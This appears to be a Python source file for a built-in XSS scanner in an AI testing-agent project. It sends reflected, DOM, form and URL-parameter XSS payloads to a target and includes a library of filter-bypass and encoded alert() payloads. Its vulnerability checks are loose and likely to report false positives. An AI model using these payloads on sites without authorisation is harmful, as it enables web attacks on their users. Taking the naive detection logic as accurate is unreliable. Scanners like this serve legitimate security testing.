"""
XSStrike 扫描工具封装 - 内置版本

内置XSS检测功能，不依赖外部XSStrike工具
作者: Ai_Test_Agent Team
"""
import asyncio
import json
import logging
import re
import urllib.parse
from typing import Dict, List, Any, Optional
import aiohttp
import random

logger = logging.getLogger(__name__)


class XSStrikeRunner:
    """内置 XSStrike 扫描器"""
    
    def __init__(self):
        self.tool_name = "xsstrike"
        self.payloads = self._get_xss_payloads()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
    
    async def run(self, target: str, config: Dict = None) -> List[Dict]:
        """
        运行内置 XSStrike 扫描
        
        Args:
            target: 扫描目标URL
            config: 扫描配置
            
        Returns:
            List[Dict]: 扫描结果列表
        """
        config = config or {}
        results = []
        
        logger.info(f"开始XSS扫描: {target}")
        
        try:
            # 1. 反射型XSS检测
            reflected_results = await self._test_reflected_xss(target, config)
            results.extend(reflected_results)
            
            # 2. DOM XSS检测
            if config.get("test_dom", True):
                dom_results = await self._test_dom_xss(target, config)
                results.extend(dom_results)
            
            # 3. 表单XSS检测
            if config.get("test_forms", True):
                form_results = await self._test_form_xss(target, config)
                results.extend(form_results)
            
            # 4. URL参数XSS检测
            if config.get("test_params", True):
                param_results = await self._test_param_xss(target, config)
                results.extend(param_results)
            
            logger.info(f"XSS扫描完成，发现 {len(results)} 个潜在漏洞")
            return results
            
        except Exception as e:
            logger.error(f"XSS扫描异常: {e}")
            return []
    
    async def _test_reflected_xss(self, target: str, config: Dict) -> List[Dict]:
        """测试反射型XSS"""
        results = []
        
        # 基础反射测试载荷
        test_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
        ]
        
        async with aiohttp.ClientSession(headers=self.headers) as session:
            for payload in test_payloads:
                try:
                    # 测试GET参数
                    test_url = f"{target}?test={urllib.parse.quote(payload)}"
                    
                    async with session.get(test_url, timeout=10) as response:
                        content = await response.text()
                        
                        # 检查载荷是否被反射
                        if payload in content or urllib.parse.unquote(payload) in content:
                            # 进一步验证是否可执行
                            if self._is_xss_vulnerable(content, payload):
                                results.append({
                                    "tool": "xsstrike",
                                    "severity": "medium",
                                    "title": "Reflected XSS Vulnerability",
                                    "description": f"反射型XSS漏洞，载荷: {payload}",
                                    "vuln_type": "xss",
                                    "xss_type": "reflected",
                                    "url": test_url,
                                    "param": "test",
                                    "payload": payload,
                                    "evidence": f"载荷在响应中被反射: {payload}",
                                    "method": "GET"
                                })
                                break  # 找到一个就够了
                        
                except Exception as e:
                    logger.debug(f"反射XSS测试失败 {payload}: {e}")
                    continue
        
        return results
    
    async def _test_dom_xss(self, target: str, config: Dict) -> List[Dict]:
        """测试DOM XSS"""
        results = []
        
        # DOM XSS测试载荷
        dom_payloads = [
            "#<script>alert('DOM_XSS')</script>",
            "#<img src=x onerror=alert('DOM_XSS')>",
            "#javascript:alert('DOM_XSS')",
        ]
        
        async with aiohttp.ClientSession(headers=self.headers) as session:
            for payload in dom_payloads:
                try:
                    test_url = f"{target}{payload}"
                    
                    async with session.get(test_url, timeout=10) as response:
                        content = await response.text()
                        
                        # 检查DOM操作相关的JavaScript
                        if self._has_dom_manipulation(content):
                            results.append({
                                "tool": "xsstrike",
                                "severity": "medium",
                                "title": "Potential DOM XSS Vulnerability",
                                "description": f"潜在DOM XSS漏洞，载荷: {payload}",
                                "vuln_type": "xss",
                                "xss_type": "dom",
                                "url": test_url,
                                "payload": payload,
                                "evidence": "检测到DOM操作，可能存在DOM XSS",
                                "method": "GET"
                            })
                            break
                        
                except Exception as e:
                    logger.debug(f"DOM XSS测试失败 {payload}: {e}")
                    continue
        
        return results
    
    async def _test_form_xss(self, target: str, config: Dict) -> List[Dict]:
        """测试表单XSS"""
        results = []
        
        try:
            async with aiohttp.ClientSession(headers=self.headers) as session:
                # 获取页面内容，查找表单
                async with session.get(target, timeout=10) as response:
                    content = await response.text()
                    
                    # 简单的表单检测
                    forms = re.findall(r'<form[^>]*>(.*?)</form>', content, re.DOTALL | re.IGNORECASE)
                    
                    for form in forms:
                        # 查找输入字段
                        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', form, re.IGNORECASE)
                        
                        if inputs:
                            # 测试表单XSS
                            form_data = {}
                            test_payload = "<script>alert('FORM_XSS')</script>"
                            
                            for input_name in inputs:
                                form_data[input_name] = test_payload
                            
                            try:
                                async with session.post(target, data=form_data, timeout=10) as post_response:
                                    post_content = await post_response.text()
                                    
                                    if test_payload in post_content:
                                        results.append({
                                            "tool": "xsstrike",
                                            "severity": "high",
                                            "title": "Form XSS Vulnerability",
                                            "description": f"表单XSS漏洞，字段: {', '.join(inputs)}",
                                            "vuln_type": "xss",
                                            "xss_type": "stored",
                                            "url": target,
                                            "param": inputs[0],
                                            "payload": test_payload,
                                            "evidence": f"表单提交后载荷被反射: {test_payload}",
                                            "method": "POST"
                                        })
                                        break
                            except Exception as e:
                                logger.debug(f"表单POST测试失败: {e}")
                                continue
        
        except Exception as e:
            logger.debug(f"表单XSS测试失败: {e}")
        
        return results
    
    async def _test_param_xss(self, target: str, config: Dict) -> List[Dict]:
        """测试URL参数XSS"""
        results = []
        
        # 解析URL参数
        parsed_url = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return results
        
        async with aiohttp.ClientSession(headers=self.headers) as session:
            for param_name in params.keys():
                test_payload = f"<img src=x onerror=alert('{param_name}_XSS')>"
                
                # 构造测试URL
                new_params = params.copy()
                new_params[param_name] = [test_payload]
                
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))
                
                try:
                    async with session.get(test_url, timeout=10) as response:
                        content = await response.text()
                        
                        if test_payload in content:
                            results.append({
                                "tool": "xsstrike",
                                "severity": "medium",
                                "title": "Parameter XSS Vulnerability",
                                "description": f"URL参数XSS漏洞，参数: {param_name}",
                                "vuln_type": "xss",
                                "xss_type": "reflected",
                                "url": test_url,
                                "param": param_name,
                                "payload": test_payload,
                                "evidence": f"参数{param_name}存在XSS漏洞",
                                "method": "GET"
                            })
                
                except Exception as e:
                    logger.debug(f"参数XSS测试失败 {param_name}: {e}")
                    continue
        
        return results
    
    def _is_xss_vulnerable(self, content: str, payload: str) -> bool:
        """检查是否真的存在XSS漏洞"""
        # 简单的XSS检测逻辑
        dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<img[^>]*onerror[^>]*>',
            r'<svg[^>]*onload[^>]*>',
            r'javascript:',
            r'on\w+\s*=',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def _has_dom_manipulation(self, content: str) -> bool:
        """检查是否有DOM操作"""
        dom_patterns = [
            r'document\.write',
            r'innerHTML',
            r'outerHTML',
            r'document\.location',
            r'window\.location',
            r'eval\s*\(',
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def _get_xss_payloads(self) -> List[str]:
        """获取XSS测试载荷库"""
        return [
            # 基础载荷
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # 绕过过滤器
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<IMG SRC=x ONERROR=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            
            # 编码载荷
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # 事件处理器
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            
            # HTML5载荷
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            
            # JavaScript载荷
            "javascript:alert('XSS')",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            
            # 高级载荷
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>",
            "<script>eval('alert(\"XSS\")')</script>",
        ]
    
    async def check_available(self) -> bool:
        """检查内置XSStrike是否可用"""
        try:
            # 内置版本始终可用
            return True
        except Exception:
            return False
    
    def get_payloads(self) -> List[str]:
        """获取XSS测试载荷"""
        return self.payloads